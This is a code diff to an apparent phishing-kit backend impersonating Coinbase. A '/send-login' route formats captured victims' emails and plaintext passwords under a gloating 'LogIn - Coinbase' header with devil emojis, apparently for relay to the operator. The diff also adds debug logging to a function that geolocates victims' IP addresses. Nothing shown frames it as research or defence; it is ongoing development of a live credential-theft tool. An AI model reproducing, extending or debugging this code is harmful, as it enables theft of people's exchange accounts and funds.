@@ -26,12 +26,20 @@ function detectDevice(userAgent) {
 
 async function detectRegion(ip) {
   try {
+    console.log(`   🌍 Detecting region for IP: ${ip}`);
     const response = await fetch(`https://get.geojs.io/v1/ip/geo.json?ip=${ip}`);
     const data = await response.json();
-    const city = data.city || "Unknown";
-    const country = data.country || "Unknown";
-    return `${city}, ${country}`;
+    
+    console.log(`   📍 Region API response:`, data);
+    
+    const city = data.city || data.latitude || "Unknown";
+    const country = data.country || data.country_name || "Unknown";
+    
+    const region = `${city}, ${country}`;
+    console.log(`   ✅ Region detected: ${region}`);
+    return region;
   } catch (error) {
+    console.error(`   ❌ Region detection error:`, error.message);
     return "Unknown Region";
   }
 }
@@ -131,7 +139,6 @@ app.post("/send-login", async (req, res) => {
     
     const message =
       `😈😈😈😈 <b>LogIn - Coinbase</b> 😈😈😈😈\n` +
-      `\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
       `<b>📧 Email:</b> <code>${email}</code>\n` +
       `<b>🔑 Password:</b> <code>${password}</code>\n` +
